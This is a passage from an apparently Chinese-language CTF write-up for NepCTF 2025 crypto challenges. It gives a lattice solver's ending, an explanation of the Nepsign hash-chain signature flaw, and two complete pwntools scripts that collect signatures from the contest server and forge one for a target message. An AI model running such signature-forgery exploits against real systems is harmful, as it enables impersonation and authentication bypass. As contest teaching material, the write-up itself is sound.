class="line">B_matrix[m][m] = 1 / p</span><br><span class="line"></span><br><span class="line">#构造目标向量</span><br><span class="line">target = [samples[i][1] for i in range(m)]</span><br><span class="line">target.append(0)  # 补上最后一位目标（α所在维度是第 m+1 位）</span><br><span class="line"></span><br><span class="line">B = matrix(B_matrix)</span><br><span class="line">t = vector(target)</span><br><span class="line"></span><br><span class="line">B_reduced = B.LLL()</span><br><span class="line">v = babai_cvp(B_reduced, t)</span><br><span class="line">u = v - t</span><br><span class="line">flag = u[m] * p</span><br><span class="line">print(long_to_bytes(int(flag)%p))</span><br></pre></td></tr></table></figure></div>

<h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a><strong>Nepsign</strong></h2><p>分析代码不难看出是一个基于哈希链上的签名，我们可以通过任意次输入明文得到对应签名，要求给出规定明文的签名来得到flag。</p>
<p>这道题的攻击方式基于哈希链的一个特点-“可追赶”性质。</p>
<p>由于哈希链是<strong>顺序累积</strong>的，有如下性质：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SM3_n(SM3_n(sk[i], s), t) = SM3_n(sk[i], s + t)</span><br></pre></td></tr></table></figure></div>

<p>已知<code>sigma_obs[i] = SM3_n(sk[i], MIN_STEP[i])</code>，想得到<code>SM3_n(sk[i], target_step[i])</code>，只需再做<code>target_step[i] - MIN_STEP[i]</code>次哈希</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SM3_n(sigma_obs[i], target_step[i] - MIN_STEP[i])</span><br><span class="line">= SM3_n(SM3_n(sk[i], MIN_STEP[i]), target_step[i] - MIN_STEP[i])</span><br><span class="line">= SM3_n(sk[i], MIN_STEP[i] + (target_step[i] - MIN_STEP[i]))</span><br><span class="line">= SM3_n(sk[i], target_step[i])</span><br><span class="line">= sigma_target[i]</span><br></pre></td></tr></table></figure></div>

<p>所以思路就很清晰了，我们输入随机生成的32字节的消息。然后得到对应签名。通过签名函数中计算step的部分计算该消息的step。这里我们把它单独提出来</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def steps_from_msg(msg: bytes):</span><br><span class="line">    h = SM3(msg)</span><br><span class="line">    m_bin = bin(int(h, 16))[2:].zfill(256)</span><br><span class="line">    a = [int(m_bin[8 * i:8 * i + 8], 2) for i in range(32)]</span><br><span class="line">    step = a + [0] * 16</span><br><span class="line">    for i in range(16):</span><br><span class="line">        s = 0</span><br><span class="line">        for j, ch in enumerate(h, 1):</span><br><span class="line">            if ch == HEX[i]:</span><br><span class="line">                s += j</span><br><span class="line">        step[32 + i] = s % 255</span><br><span class="line">    return step</span><br></pre></td></tr></table></figure></div>

<p>检查每个分量，如果这次新采集到的步数比历史最小步数还小，则更新最小步数和签名。如果所有分量的最小步数都≤目标消息的step[i]。因为只有拥有比目标步数小的签名，才能通过继续哈希“追赶”到目标步数。然后根据之前讲到的性质对每个分量进行(target_step[i] - MIN_STEP[i])次SM3哈希即可。(也可以利用相同位置产生相同签名来进行碰撞)</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import sm3</span><br><span class="line">from os import urandom</span><br><span class="line">from pwn import remote, context</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;warning&#x27;</span><br><span class="line">HOST, PORT = &#x27;nepctf30-yb67-wgkm-f37g-75ppqjxnr857.nepctf.com&#x27;, 443</span><br><span class="line"></span><br><span class="line">target_msg = b&#x27;happy for NepCTF 2025&#x27;</span><br><span class="line">HEX = &#x27;0123456789abcdef&#x27;</span><br><span class="line">def SM3(data: bytes) -&gt; str:</span><br><span class="line">    return sm3.sm3_hash(list(data))</span><br><span class="line">def steps_from_msg(msg: bytes):</span><br><span class="line">    h = SM3(msg)</span><br><span class="line">    m_bin = bin(int(h, 16))[2:].zfill(256)</span><br><span class="line">    a = [int(m_bin[8 * i:8 * i + 8], 2) for i in range(32)]</span><br><span class="line">    step = a + [0] * 16</span><br><span class="line">    for i in range(16):</span><br><span class="line">        s = 0</span><br><span class="line">        for j, ch in enumerate(h, 1):</span><br><span class="line">            if ch == HEX[i]:</span><br><span class="line">                s += j</span><br><span class="line">        step[32 + i] = s % 255</span><br><span class="line">    return step</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_step = steps_from_msg(target_msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sm3_n(hexstr, n):</span><br><span class="line">    d = bytes.fromhex(hexstr)</span><br><span class="line">    for _ in range(n):</span><br><span class="line">        d = bytes.fromhex(SM3(d))</span><br><span class="line">    return d.hex()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MIN_STEP = [999] * 48</span><br><span class="line">SIGMA = [&#x27;&#x27;] * 48</span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT,ssl=True)</span><br><span class="line">io.recvuntil(b&#x27;initializing...&#x27;)</span><br><span class="line"></span><br><span class="line">whileTrue:</span><br><span class="line">    # 随机消息</span><br><span class="line">    m = urandom(32)</span><br><span class="line">    io.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;msg: &#x27;, m.hex().encode())</span><br><span class="line">    raw = io.recvline().strip()</span><br><span class="line">    print(raw)</span><br><span class="line">    sig = eval(raw.decode())</span><br><span class="line">    step_obs = steps_from_msg(m)</span><br><span class="line"></span><br><span class="line">    updated = False</span><br><span class="line">    for i in range(48):</span><br><span class="line">        if step_obs[i] &lt; MIN_STEP[i]:</span><br><span class="line">            MIN_STEP[i] = step_obs[i]</span><br><span class="line">            SIGMA[i] = sig[i]</span><br><span class="line">            updated = True</span><br><span class="line">    if all(MIN_STEP[i] &lt;= target_step[i] for i in range(48)):</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(&#x27;[+] coverage OK, forging...&#x27;)</span><br><span class="line"></span><br><span class="line">sigma_final = [</span><br><span class="line">    sm3_n(SIGMA[i], target_step[i] - MIN_STEP[i])</span><br><span class="line">    for i in range(48)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(b&#x27;give me a qq: &#x27;, str(sigma_final).encode())</span><br><span class="line">print(io.recvline().decode().strip())</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></div>

<p>上面是官方EXP，下面是我的</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制SM3和SM3_n函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits//<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算目标消息的a_target和b_target</span></span><br><span class="line">target_msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line">target_hash = SM3(target_msg)</span><br><span class="line">target_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(target_hash, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">a_target = [<span class="built_in">int</span>(target_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">b_target = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">        <span class="keyword">if</span> target_hash[k-<span class="number">1</span>] == hex_symbols[j]:</span><br><span class="line">            s += k</span><br><span class="line">    b_target[j] = s % <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置服务器连接</span></span><br><span class="line">HOST = <span class="string">&#x27;nepctf31-2a1a-trtz-npvt-zrogd1ujf456.nepctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line">MAX_RETRIES = <span class="number">5</span></span><br><span class="line">COLLECTION_SIZE = <span class="number">2500</span>  <span class="comment"># 增加收集数量确保覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect_server</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;建立TLS连接并初始化会话&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(MAX_RETRIES):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            context = ssl.create_default_context()</span><br><span class="line">            r = remote(HOST, PORT, ssl=<span class="literal">True</span>, ssl_context=context)</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">            log.success(<span class="string">f&quot;Connected to <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> (attempt <span class="subst">&#123;attempt+<span class="number">1</span>&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.warning(<span class="string">f&quot;Connection failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> attempt &lt; MAX_RETRIES - <span class="number">1</span>:</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">    log.error(<span class="string">&quot;Failed to establish connection after multiple attempts&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collect_signatures</span>(<span class="params">r, required_count</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;收集签名数据直到满足要求&quot;&quot;&quot;</span></span><br><span class="line">    positions = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">    collected = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">any</span>(<span class="built_in">len</span>(p) == <span class="number">0</span> <span class="keyword">for</span> p <span class="keyword">in</span> positions) <span class="keyword">and</span> collected &lt; required_count:</span><br><span class="line">        <span class="comment"># 生成随机消息</span></span><br><span class="line">        msg = os.urandom(<span class="number">16</span>)</span><br><span class="line">        msg_hex = msg.<span class="built_in">hex</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送签名请求</span></span><br><span class="line">            r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">            r.sendlineafter(<span class="string">b&#x27;msg: &#x27;</span>, msg_hex.encode())</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 接收并解析响应</span></span><br><span class="line">            resp = r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> resp:</span><br><span class="line">                log.warning(<span class="string">&quot;No response received, reconnecting...&quot;</span>)</span><br><span class="line">                r.close()</span><br><span class="line">                r = connect_server()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># 尝试解析签名</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sig_line = resp.split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                qq = literal_eval(sig_line.decode())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(qq) != <span class="number">48</span>:</span><br><span class="line">                    log.warning(<span class="string">f&quot;Invalid signature length: <span class="subst">&#123;<span class="built_in">len</span>(qq)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.warning(<span class="string">f&quot;Signature parse error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                log.debug(<span class="string">f&quot;Response: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 计算当前消息的哈希</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                m = SM3(msg)</span><br><span class="line">                m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">                a_list = [<span class="built_in">int</span>(m_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">                b_list = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                    s = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                        <span class="keyword">if</span> m[k-<span class="number">1</span>] == hex_symbols[j]:</span><br><span class="line">                            s += k</span><br><span class="line">                    b_list[j] = s % <span class="number">255</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                log.warning(<span class="string">f&quot;Hash calculation error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 收集满足条件的数据</span></span><br><span class="line">            collected += <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">                <span class="keyword">if</span> a_list[i] &lt;= a_target[i]:</span><br><span class="line">                    positions[i].append((a_list[i], qq[i]))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                idx = <span class="number">32</span> + j</span><br><span class="line">                <span class="keyword">if</span> b_list[j] &lt;= b_target[j]:</span><br><span class="line">                    positions[idx].append((b_list[j], qq[idx]))</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 进度显示</span></span><br><span class="line">            <span class="keyword">if</span> collected % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                missing = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> p <span class="keyword">in</span> positions <span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">0</span>)</span><br><span class="line">                log.info(<span class="string">f&quot;Collected <span class="subst">&#123;collected&#125;</span> messages, missing positions: <span class="subst">&#123;missing&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.warning(<span class="string">&quot;Connection lost, reconnecting...&quot;</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            r = connect_server()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(<span class="string">f&quot;Unexpected error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            r = connect_server()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> r, positions, collected</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主攻击流程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_attack</span>():</span><br><span class="line">    <span class="comment"># 建立连接</span></span><br><span class="line">    r = connect_server()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 收集签名数据</span></span><br><span class="line">    r, positions, collected = collect_signatures(r, COLLECTION_SIZE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查数据完整性</span></span><br><span class="line">    missing_positions = [i <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(positions) <span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> missing_positions:</span><br><span class="line">        log.warning(<span class="string">f&quot;Missing data for positions: <span class="subst">&#123;missing_positions&#125;</span>&quot;</span>)</span><br><span class="line">        log.info(<span class="string">&quot;Trying to proceed with available data...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建目标签名</span></span><br><span class="line">    target_qq = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">if</span> positions[i]:</span><br><span class="line">            k_max, value_str = <span class="built_in">max</span>(positions[i], key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">            value_bytes = <span class="built_in">bytes</span>.fromhex(value_str)</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">32</span>:</span><br><span class="line">                n_times = a_target[i] - k_max</span><br><span class="line">                qq_i = SM3_n(value_bytes, n_times, <span class="number">256</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = i - <span class="number">32</span></span><br><span class="line">                n_times = b_target[j] - k_max</span><br><span class="line">                qq_i = SM3_n(value_bytes, n_times, <span class="number">256</span>)</span><br><span class="line">            target_qq.append(qq_i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 使用默认值（可能失败但尝试提交）</span></span><br><span class="line">            log.warning(<span class="string">f&quot;Using default value for position <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            target_qq.append(<span class="string">&quot;0&quot;</span>*<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提交伪造签名</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;give me a qq: &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(target_qq).encode())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        flag_resp = r.recvall(timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;NepCTF&#x27;</span> <span class="keyword">in</span> flag_resp <span class="keyword">or</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag_resp:</span><br><span class="line">            log.success(<span class="string">f&quot;FLAG CAPTURED: <span class="subst">&#123;flag_resp.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.warning(<span class="string">f&quot;Unexpected response: <span class="subst">&#123;flag_resp&#125;</span>&quot;</span>)</span><br><span class="line">            log.info(<span class="string">&quot;Retrying attack with more data...&quot;</span>)</span><br><span class="line">            <span class="comment"># 重试机制</span></span><br><span class="line">            main_attack()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;Submission failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log.info(<span class="string">&quot;Starting attack on NepCTF signature challenge&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Target message: <span class="subst">&#123;target_msg.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Target hash: <span class="subst">&#123;target_hash&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;a_target: <span class="subst">&#123;a_target&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;b_target: <span class="subst">&#123;b_target&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main_attack()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        log.info(<span class="string">&quot;Attack interrupted by user&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;Critical error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>攻击原理：</p>
<p>该漏洞源于签名方案的设计缺陷：</p>
<p>签名由48个组件构成（前32个基于消息哈希字节，后16个基于字符位置和）</p>
<p>验证时对每个组件应用255 - step次SM3哈希</p>
<p>通过收集满足step ≤ target_step的签名组件</p>
<p>只需额外应用(target_step - collected_step)次哈希即可伪造目标签名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml33608\wps9.jpg"
                      alt="img"
                ></p>
<h2 id="Transition"><a href="#Transition" class="headerlink" title="Transition"></a><strong>Transition</strong></h2><p>出这个题的初衷是最近在做掩码电路的研究，注意到掩码电路的抗侧信道能力与软件掩码其实考虑并不相同，主要就集中在几大物理特性上——glitch,transition,coupling。（因为另外两个比较难模拟所以选了transition）</p>
<p>具体来说，transition特性其实可以认为是汉明距离的一部分成因：在芯片内部的reg元件在每个cycle都会因为输入数据的翻转导致不同的功耗模式，进一步当数据被搬入每次被刷新为0的寄存器时就产生了汉明重量特征（不准确）。</p>
